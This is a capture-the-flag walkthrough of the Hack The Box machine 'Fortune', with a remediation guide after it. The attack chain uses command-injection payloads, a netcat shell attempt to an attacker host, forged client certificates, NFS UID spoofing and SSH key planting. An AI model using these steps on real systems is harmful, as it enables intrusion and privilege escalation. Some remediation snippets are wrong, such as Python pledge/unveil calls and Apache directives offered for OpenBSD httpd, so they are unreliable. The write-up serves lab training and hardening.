---
title: "Fortune HTB - Insane OpenBSD Box Walkthrough"
date: 2025-09-22T08:45:00Z
tags: ["insane-openbsd", "web", "command-injection", "ssl", "certificate", "ssh", "authpf", "nfs", "uid-manipulation", "postgresql", "pgadmin", "crypto", "privilege-escalation"]
difficulty: ["insane"]
categories: ["HTB", "OpenBSD"]
draft: false
description: "Complete walkthrough of Fortune HTB machine featuring command injection exploitation, SSL client certificate generation, authpf firewall bypass, NFS share enumeration with UID manipulation, and PostgreSQL password decryption for root access"
---

# Fortune HTB - Insane OpenBSD Box Walkthrough

{{< youtube _BLd046r-co >}}

## Exploitation Steps

Below is a chronological extraction of the key exploitation steps and techniques used in the "Fortune" Hack The Box challenge, as described in the provided transcript:

1. **Initial Reconnaissance with Nmap**
   - **Technique**: Port scanning and service enumeration
   - **Step**: Ran `nmap -sC -sV -oA nmap/fortune [TARGET-IP]` to identify open ports and services.
   - **Findings**:
     - Port 22 (SSH, OpenSSH 7.9)
     - Port 80 (HTTP, OpenBSD httpd)
     - Port 443 (HTTPS, requires client certificate, TLS randomness issue noted)

2. **Web Enumeration on Port 443 (HTTPS)**
   - **Technique**: SSL certificate analysis
   - **Step**: Visited `https://[TARGET-IP]`, encountered a client certificate requirement. Used `openssl s_client -connect [TARGET-IP]:443` to retrieve the certificate.
   - **Findings**: Identified potential users (`charlie` and `bob`) and hostname (`fortune.htb`). Noted an intermediate CA for compartmentalized security.

3. **Web Enumeration on Port 80 (HTTP)**
   - **Technique**: Manual web interaction and proxy interception
   - **Step**: Visited `http://[TARGET-IP]`, found a fortune database selection page. Used Burp Suite to intercept requests and test inputs (e.g., `db=star_trek`).
   - **Findings**: Page displayed random fortunes; no immediate errors on invalid inputs.

4. **Fuzzing for Command Injection**
   - **Technique**: Special character fuzzing with `wfuzz`
   - **Step**: Used `wfuzz -w /usr/share/seclists/Fuzzing/special-chars.txt -d "db=star_trek&FUZZ" http://[TARGET-IP]/select` to test special characters (`&`, `\`, `;`, `+`). Filtered responses by hiding 293-byte responses (indicating no fortune).
   - **Findings**:
     - `&` and `;` caused abnormal responses, suggesting command injection.
     - `+` likely converted to a space, causing a false positive.
     - Confirmed command injection with `;id`, which executed and returned output.

5. **Exploiting Command Injection**
   - **Technique**: Command injection via POST parameter
   - **Step**: Tested commands like `;which nc` (confirmed Netcat presence) and attempted reverse shell (`;nc -lvnp 443 [ATTACKER-IP]`), but failed due to firewall. Used `;tcpdump -i any icmp` to confirm ICMP connectivity.
   - **Findings**: Command injection allowed arbitrary command execution, but outbound connections were blocked.

6. **Automating Command Injection with Python Script**
   - **Technique**: Scripting for pseudo-shell
   - **Step**: Created a Python script (`cmd_inject.py`) using the `requests` library to send POST requests with injected commands (e.g., `db=echo -n please_support_me;cmd;echo -n on_patreon`). Used regex to extract command output between markers.
   - **Findings**: Established a reliable pseudo-shell for executing commands and retrieving output.

7. **System Enumeration via Pseudo-Shell**
   - **Technique**: File and process enumeration
   - **Step**: Ran commands like `ps -ax`, `find /var/www`, and `ls -la /var/www` to explore the system. Identified a Flask app (`fortune.py`) and a PostgreSQL password file (`/var/www/ssh_auth/pg_pass`).
   - **Findings**:
     - Discovered `fortune.py` (vulnerable Flask app with no input sanitization via `os.popen`).
     - Found `ssh_auth.py` and `authpf` configuration, indicating SSH-based firewall rule updates.

8. **Certificate Generation for Port 443 Access**
   - **Technique**: SSL client certificate creation
   - **Step**:
     - Located intermediate CA certificate (`intermediate.cert.pem`) and key (`intermediate.key`) in `/home/bob`.
     - Generated a private key (`openssl genrsa -out ipsec.key 2048`), certificate signing request (`openssl req -new -key ipsec.key -out ipsec.csr`), and signed certificate (`openssl x509 -req -in ipsec.csr -CA intermediate.cert -CAkey intermediate.key -out ipsec.pem`).
     - Packaged certificate into PKCS12 format (`openssl pkcs12 -export -out ipsec.pfx -inkey ipsec.key -in ipsec.pem -certfile intermediate.cert`) and imported into Firefox.
     - Adjusted system time to resolve certificate validation issues.
   - **Findings**: Successfully accessed `https://fortune.htb`, which provided an SSH key for the `nfsuser`.

9. **SSH Access as `nfsuser`**
   - **Technique**: SSH authentication with provided key
   - **Step**: Used `ssh -i fortune.ssh nfsuser@[TARGET-IP]` to log in. Ran `nmap -v [TARGET-IP]` to discover new ports (111, 8081, 2049).
   - **Findings**: Gained shell as `nfsuser`; new ports opened due to `authpf` rules (BSD packet filter).

10. **NFS Share Exploitation**
    - **Technique**: NFS mounting and UID manipulation
    - **Step**:
      - Installed `nfs-common` and ran `showmount -e [TARGET-IP]` to identify `/home` share accessible to everyone.
      - Mounted the share (`mount -t nfs -o vers=2 [TARGET-IP]:/home /mnt`).
      - Modified local user `pleasesub` UID to 1000 (matching `charlie`) to access `/mnt/charlie`.
    - **Findings**: Accessed `charlie`'s home directory, including `user.txt` and an `mbox` file indicating the PostgreSQL password equals the root password.

11. **SSH Access as `charlie`**
    - **Technique**: SSH key injection
    - **Step**: Generated an SSH key pair (`ssh-keygen -f charlie.ssh`), added the public key to `/mnt/charlie/.ssh/authorized_keys`, and logged in (`ssh -i charlie.ssh charlie@[TARGET-IP]`).
    - **Findings**: Gained shell as `charlie`.

12. **PostgreSQL Database Access**
    - **Technique**: SQLite database query
    - **Step**: Accessed `/var/www/pgadmin4.db` (SQLite3 database) as `charlie`. Queried `SELECT * FROM user` and `SELECT * FROM server` to retrieve encrypted credentials.
    - **Findings**: Found encrypted PostgreSQL credentials in the `server` table.

13. **Decrypting PostgreSQL Password**
    - **Technique**: Source code analysis and decryption
    - **Step**:
      - Located `pgadmin4.ini` and `crypto.py` in the web application source.
      - Identified decryption function in `crypto.py` using a key from `user.password`.
      - Copied `crypto.py` to local system, used `charlie`'s password (from `mbox`) to decrypt the ciphertext, revealing the PostgreSQL password.
    - **Findings**: Decrypted password matched the root password.

14. **Root Privilege Escalation**
    - **Technique**: Password reuse
    - **Step**: Used the decrypted PostgreSQL password to `su root`.
    - **Findings**: Successfully escalated to root, completing the box.

**Summary of Techniques**:
- Port scanning (Nmap)
- SSL certificate analysis (OpenSSL)
- Web fuzzing and command injection (wfuzz, Burp Suite)
- Python scripting for pseudo-shell
- Client certificate generation (OpenSSL)
- SSH authentication and key injection
- NFS share mounting and UID manipulation
- SQLite database querying
- Source code analysis and decryption

This attack chain leveraged web vulnerabilities, SSL certificate creation, NFS misconfiguration, and password reuse to achieve root access on an OpenBSD system.

## Security Gaps and Remediation

Based on the provided transcript of the "Fortune" Hack The Box challenge, several vulnerabilities in services and systems were exploited to achieve root access. Below is a list of the identified gaps in each service or system, along with recommended fixes, categorized by whether they require a source code fix or a configuration fix.

---

### 1. **Web Application (HTTP on Port 80 - Flask App: fortune.py)**
**Gap**: Command Injection Vulnerability
- **Description**: The Flask application (`fortune.py`) accepts a `db` parameter via a POST request and uses it in a shell command via `os.popen` without sanitization, allowing arbitrary command execution (e.g., `;id`, `;ls`).
- **Impact**: Attackers can execute arbitrary commands on the server, leading to unauthorized access, data leakage, or full system compromise.
- **Fix Type**: Source Code Fix
- **Recommended Fix**:
  - **Input Sanitization**: Modify `fortune.py` to sanitize the `db` parameter. Use a whitelist of allowed database names (e.g., `star_trek`, `quotes`) and reject any input containing special characters (e.g., `;`, `&`, `\`, `+`). Example in Python:
    ```python
    allowed_dbs = ['star_trek', 'quotes']
    if selection not in allowed_dbs:
        raise ValueError("Invalid database selection")
    shell_command = f"cmd {selection}"  # Ensure no injection is possible
    ```
  - **Avoid `os.popen`**: Replace `os.popen` with a safer method, such as direct database queries or a secure subprocess call with proper argument escaping (e.g., `subprocess.run` with a list of arguments). Example:
    ```python
    import subprocess
    result = subprocess.run(['cmd', selection], capture_output=True, text=True)
    ```
  - **HTML Entity Encoding**: Ensure output is properly encoded to prevent cross-site scripting (XSS) if applicable, using libraries like `html` in Python.

---

### 2. **HTTPS Service (Port 443 - SSL Certificate Authentication)**
**Gap**: Improper Certificate Validation and Time-Based Rejection
- **Description**: The HTTPS service requires a client certificate signed by an intermediate CA but rejects certificates due to a time mismatch between the server and client. Additionally, the intermediate CA certificate and key are accessible in a world-readable directory (`/home/bob`), allowing attackers to forge valid client certificates.
- **Impact**: Attackers can forge client certificates to access restricted services, and time mismatches cause unnecessary rejections, complicating legitimate access.
- **Fix Type**: Configuration Fix
- **Recommended Fix**:
  - **Secure CA Storage**: Restrict access to the intermediate CA certificate and key (`intermediate.cert.pem`, `intermediate.key`) by setting proper permissions (e.g., `chmod 600 /home/bob/intermediate.*` and `chown root:root /home/bob/intermediate.*`). Move sensitive files to a secure directory (e.g., `/etc/ssl/private`).
  - **Time Synchronization**: Configure the server to use Network Time Protocol (NTP) to ensure accurate time, preventing certificate validation failures. On OpenBSD:
    ```shell
    rcctl enable ntpd
    rcctl start ntpd
    ```
  - **Strengthen Certificate Validation**: Enforce stricter certificate validation policies, such as requiring specific Organizational Unit (OU) fields or revoking compromised certificates via a Certificate Revocation List (CRL). Update the web server configuration (e.g., OpenBSD `httpd.conf`) to enforce these checks:
    ```conf
    SSLVerifyClient require
    SSLVerifyDepth 2
    SSLCARevocationFile /etc/ssl/crl.pem
    ```

---

### 3. **SSH Service (Port 22 - authpf Integration)**
**Gap**: Automatic Firewall Rule Updates via `authpf`
- **Description**: The `authpf` service modifies BSD packet filter (`pf`) rules upon successful SSH login as `nfsuser`, opening additional ports (e.g., 111, 8081, 2049) to the client's IP. This exposes sensitive services like NFS without sufficient restrictions.
- **Impact**: Unauthorized users gaining SSH access can expose internal services, increasing the attack surface.
- **Fix Type**: Configuration Fix
- **Recommended Fix**:
  - **Restrict `authpf` Rules**: Modify `/etc/authpf/authpf.rules` to limit opened ports to specific, necessary services and restrict access to trusted IPs or networks. Example:
    ```pf
    ext_if = "em0"
    pass in quick on $ext_if proto { tcp, udp } from $user_ip to $ext_if port { 22, 80 } keep state
    ```
  - **Disable `authpf` for Unprivileged Users**: Restrict `authpf` usage to administrative users, not low-privilege accounts like `nfsuser`. Update `/etc/authpf/authpf.conf` or remove `authpf` from `nfsuser`'s shell in `/etc/passwd`.
  - **SSH Hardening**: Enforce stronger SSH authentication (e.g., multi-factor authentication) and disable password-based logins for `nfsuser`. Edit `/etc/ssh/sshd_config`:
    ```conf
    PasswordAuthentication no
    AllowUsers admin
    ```

---

### 4. **NFS Service (Port 2049)**
**Gap**: Unrestricted NFS Share Access
- **Description**: The NFS share (`/home`) is configured with the `everyone` option, allowing any client to mount it. NFS version 2 lacks authentication, relying on client-provided UIDs, enabling attackers to manipulate local UIDs to access restricted directories (e.g., `charlie`'s home).
- **Impact**: Attackers can access sensitive files (e.g., `user.txt`, `.ssh/authorized_keys`) by spoofing UIDs, leading to privilege escalation.
- **Fix Type**: Configuration Fix
- **Recommended Fix**:
  - **Restrict NFS Access**: Update `/etc/exports` to limit the `/home` share to specific IP addresses or subnets and enforce read-only access if possible. Example:
    ```exports
    /home -ro -network 10.10.10.0/24
    ```
  - **Use NFSv4 with Authentication**: Upgrade to NFSv4, which supports Kerberos-based authentication and stronger access controls. Configure `/etc/exports` for NFSv4:
    ```exports
    /home -sec=krb5 -network 10.10.10.0/24
    ```
  - **Restrict Directory Permissions**: Ensure user home directories are not world-readable (e.g., `chmod 700 /home/*`). Prevent unauthorized access to `.ssh` directories:
    ```shell
    chmod 700 /home/*/ .ssh
    chmod 600 /home/*/ .ssh/authorized_keys
    ```

---

### 5. **PostgreSQL/pgAdmin Service (Database Access)**
**Gap**: Weak Password Storage and Reuse
- **Description**: The PostgreSQL password is stored encrypted in `pgadmin4.db` but decrypted using a key derived from `charlie`'s password, which is reused as the root password. The database file and decryption script (`crypto.py`) are accessible to `charlie`.
- **Impact**: Password reuse and accessible decryption logic allow attackers to escalate to root privileges.
- **Fix Type**: Configuration Fix and Source Code Fix
- **Recommended Fix**:
  - **Configuration Fix**:
    - **Secure File Permissions**: Restrict access to `pgadmin4.db` and `crypto.py` to the `appserve` user or root (e.g., `chmod 600 /var/www/pgadmin4.db`, `chown appserve /var/www/pgadmin4.db`).
    - **Eliminate Password Reuse**: Ensure the PostgreSQL password differs from the root password. Update the password in the PostgreSQL configuration and `pgadmin4.db`. Example for PostgreSQL:
      ```shell
      psql -U postgres -c "ALTER USER postgres WITH PASSWORD 'new_secure_password';"
      ```
    - **Use Environment Variables**: Store sensitive keys in environment variables or a secure vault (e.g., HashiCorp Vault) instead of hardcoding or deriving from user passwords.
  - **Source Code Fix**:
    - **Secure Key Management**: Modify `crypto.py` to use a securely generated key stored in a protected location (e.g., `/etc/pgadmin/secret.key`) instead of deriving from `user.password`. Example:
      ```python
      import os
      from cryptography.fernet import Fernet
      with open('/etc/pgadmin/secret.key', 'rb') as f:
          key = f.read()
      cipher = Fernet(key)
      decrypted_password = cipher.decrypt(ciphertext)
      ```
    - **Use Strong Encryption**: Ensure encryption uses a secure algorithm (e.g., Fernet) and a unique, randomly generated key per instance.

---

### 6. **General System Configuration**
**Gap**: Insecure File Permissions and Lack of Least Privilege
- **Description**: Sensitive files (e.g., `/var/www/ssh_auth/pg_pass`, `/home/bob/intermediate.*`) have overly permissive permissions, allowing unauthorized access. The `nfsuser` account has excessive privileges via `authpf`.
- **Impact**: Attackers can read or modify sensitive files, escalating privileges or exposing credentials.
- **Fix Type**: Configuration Fix
- **Recommended Fix**:
  - **Enforce Least Privilege**: Audit and restrict file permissions across the system. Use `find / -perm -o+rwx` to identify world-readable/writable files and fix them (e.g., `chmod 600 <file>`, `chown root:root <file>`).
  - **Restrict `nfsuser` Privileges**: Change `nfsuser`'s shell to a restricted shell (e.g., `/sbin/nologin`) or remove `authpf` capabilities. Edit `/etc/passwd`:
    ```passwd
    nfsuser:*:1002:1002:NFS User:/home/nfsuser:/sbin/nologin
    ```
  - **Implement Mandatory Access Controls**: Use OpenBSD's `pledge` or `unveil` to restrict application access to only necessary resources. Example for `fortune.py`:
    ```python
    import os
    os.unveil("/var/www/fortunes", "r")  # Restrict filesystem access
    os.pledge("stdio rpath")  # Restrict syscalls
    ```

---

### Summary Table of Gaps and Fixes

| **Service/System** | **Gap** | **Fix Type** | **Recommended Fix** |
|--------------------|---------|--------------|---------------------|
| Web App (Port 80) | Command Injection | Source Code | Sanitize inputs, avoid `os.popen`, encode outputs |
| HTTPS (Port 443) | Insecure CA Storage, Time Mismatch | Configuration | Secure CA files, enable NTP, enforce strict validation |
| SSH (Port 22) | Overly Permissive `authpf` Rules | Configuration | Restrict `authpf` rules, disable for unprivileged users, harden SSH |
| NFS (Port 2049) | Unrestricted Share Access | Configuration | Limit share access, use NFSv4, secure directory permissions |
| PostgreSQL/pgAdmin | Weak Password Storage, Reuse | Configuration & Source Code | Secure file permissions, eliminate reuse, use secure key management |
| General System | Insecure Permissions, Excessive Privileges | Configuration | Enforce least privilege, restrict `nfsuser`, use `pledge`/`unveil` |

---

### Additional Recommendations
- **Regular Auditing**: Use tools like `lynis` or `pfctl -sr` to audit system configurations and firewall rules.
- **Patch Management**: Ensure OpenBSD and all services (e.g., OpenSSH, httpd, PostgreSQL) are updated to the latest versions.
- **Monitoring and Logging**: Enable detailed logging for `httpd`, `sshd`, and `pf` to detect and respond to suspicious activity. Example for `httpd`:
  ```conf
  server "default" {
      listen on * port 80
      log style combined
  }
  ```

These fixes address the exploited vulnerabilities and align with security best practices to prevent similar attacks.

## Conclusion

Fortune is an excellent machine that demonstrates the complexity of OpenBSD security and the interconnected nature of system vulnerabilities. It requires expertise in:
- Web application security and command injection exploitation
- SSL/TLS certificate analysis and client certificate generation
- OpenBSD-specific services like authpf and packet filtering
- NFS protocol security and UID manipulation techniques
- PostgreSQL and pgAdmin security analysis
- Cryptographic analysis and password decryption techniques

The machine emphasizes the importance of proper input validation, secure file permissions, certificate management, and the principle of least privilege in system administration.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*